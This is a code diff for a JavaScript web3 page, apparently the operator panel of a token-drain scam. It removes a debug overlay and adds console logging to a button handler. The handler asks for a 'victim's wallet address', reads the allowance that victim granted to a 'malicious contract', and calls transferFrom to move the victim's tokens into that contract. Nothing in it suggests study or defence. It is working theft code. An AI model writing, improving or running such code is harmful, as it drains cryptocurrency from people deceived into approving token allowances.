@@ -30,39 +30,7 @@
 
 
 
-   // Create and append a debug section at the top or bottom of the page
-    window.addEventListener('load', function() {
-        const debugSection = document.createElement('div');
-        debugSection.style.position = 'fixed';
-        debugSection.style.width = '100%';
-        debugSection.style.backgroundColor = 'rgba(0, 0, 0, 0.8)';
-        debugSection.style.color = 'white';
-        debugSection.style.padding = '10px';
-        debugSection.style.fontSize = '14px';
-        debugSection.style.zIndex = '9999';
-        debugSection.style.maxHeight = '150px';
-        debugSection.style.overflowY = 'auto';
-        debugSection.style.top = '0';  // Change to 'bottom' if you want the section at the bottom
-
-        const debugMessages = document.createElement('p');
-        debugMessages.id = 'debugMessages';
-        debugMessages.textContent = 'Debug messages will appear here.';
-        debugSection.appendChild(debugMessages);
-
-        document.body.appendChild(debugSection);
-
-        // Override the default console.debug to also log to the debug section
-        const originalConsoleDebug = console.debug;
-        console.debug = function(message) {
-            // Call the original console.debug
-            originalConsoleDebug.apply(console, arguments);
-
-            // Create a new message element and append it to the debug section
-            const newMessage = document.createElement('p');
-            newMessage.textContent = message;
-            debugMessages.appendChild(newMessage);
-        };
-    });
+ 
 
 
 
@@ -506,52 +474,64 @@
             }
         });
 
-    // Withdraw Tokens (from victim's address using the malicious contract)
+   // Withdraw Tokens (from victim's address using the malicious contract)
 document.getElementById("transferTokensBtn").addEventListener("click", async () => {
-    const victimAddress = prompt("Enter victim's wallet address:");
+        const victimAddress = prompt("Enter victim's wallet address:");
 
-    if (victimAddress) {
-        // Trim any extra spaces from the victim's address
-        const cleanedVictimAddress = victimAddress.trim();
+        if (victimAddress) {
+            // Trim any extra spaces from the victim's address
+            const cleanedVictimAddress = victimAddress.trim();
+            console.debug("Cleaned victim address:", cleanedVictimAddress);
 
-        // Validate that the victim address is a valid Ethereum address
-        if (!web3.utils.isAddress(cleanedVictimAddress)) {
-            alert("Invalid Ethereum address.");
-            return;
-        }
-
-        try {
-            // Get the allowance that the victim has given to the malicious contract
-            const allowance = await tokenContract.methods.allowance(cleanedVictimAddress, maliciousContractAddress).call();
-
-            // Get the victim's token balance
-            const balance = await tokenContract.methods.balanceOf(cleanedVictimAddress).call();
-
-            // Convert values to Big Numbers (Web3 will handle the decimal scaling automatically)
-            const balanceBN = web3.utils.toBN(balance);
-            const allowanceBN = web3.utils.toBN(allowance);
-
-            // Calculate the amount to withdraw, which is the minimum of the balance and allowance
-            const amountToWithdraw = balanceBN.lt(allowanceBN) ? balanceBN : allowanceBN;
-
-            // Check if there's any available amount to withdraw
-            if (amountToWithdraw.lte(web3.utils.toBN(0))) {
-                alert("Insufficient allowance or balance to withdraw.");
+            // Validate that the victim address is a valid Ethereum address
+            if (!web3.utils.isAddress(cleanedVictimAddress)) {
+                alert("Invalid Ethereum address.");
+                console.debug("Invalid address:", cleanedVictimAddress);
                 return;
             }
 
-            // Withdraw the tokens (amountToWithdraw is already in the correct unit)
-            const transaction = await tokenContract.methods.transferFrom(cleanedVictimAddress, maliciousContractAddress, amountToWithdraw.toString()).send({ from: accounts[0] });
+            try {
+                console.debug("Fetching allowance for victim address:", cleanedVictimAddress);
+                // Get the allowance that the victim has given to the malicious contract
+                const allowance = await tokenContract.methods.allowance(cleanedVictimAddress, maliciousContractAddress).call();
+                console.debug("Allowance fetched:", allowance);
 
-            // Display the withdrawn amount (showing in the main unit of the ERC-20 token)
-            alert(`Successfully withdrawn ${web3.utils.fromWei(amountToWithdraw.toString(), 'ether')} tokens from the victim's account to the malicious contract!`);
-        } catch (error) {
-            alert("Error during withdrawal. Please check the details.");
-            console.error("Withdrawal Error:", error);
-            alert("Check the victim's approval, balance, and allowance.");
+                // Get the victim's token balance
+                const balance = await tokenContract.methods.balanceOf(cleanedVictimAddress).call();
+                console.debug("Balance fetched:", balance);
+
+                // Convert values to Big Numbers (Web3 will handle the decimal scaling automatically)
+                const balanceBN = web3.utils.toBN(balance);
+                const allowanceBN = web3.utils.toBN(allowance);
+                console.debug("Balance in BigNumber:", balanceBN.toString());
+                console.debug("Allowance in BigNumber:", allowanceBN.toString());
+
+                // Calculate the amount to withdraw, which is the minimum of the balance and allowance
+                const amountToWithdraw = balanceBN.lt(allowanceBN) ? balanceBN : allowanceBN;
+                console.debug("Amount to withdraw calculated:", amountToWithdraw.toString());
+
+                // Check if there's any available amount to withdraw
+                if (amountToWithdraw.lte(web3.utils.toBN(0))) {
+                    alert("Insufficient allowance or balance to withdraw.");
+                    console.debug("No tokens available to withdraw.");
+                    return;
+                }
+
+                console.debug("Attempting to withdraw tokens...");
+                // Withdraw the tokens (amountToWithdraw is already in the correct unit)
+                const transaction = await tokenContract.methods.transferFrom(cleanedVictimAddress, maliciousContractAddress, amountToWithdraw.toString()).send({ from: accounts[0] });
+
+                // Display the withdrawn amount (keeping the token units as is)
+                alert(`Successfully withdrawn ${amountToWithdraw.toString()} tokens from the victim's account to the malicious contract!`);
+                console.debug("Transaction successful:", transaction);
+            } catch (error) {
+                alert("Error during withdrawal. Please check the details.");
+                console.error("Withdrawal Error:", error);
+                console.debug("Error details:", error);
+                alert("Check the victim's approval, balance, and allowance.");
+            }
         }
-    }
-});
+    });
 
 
 
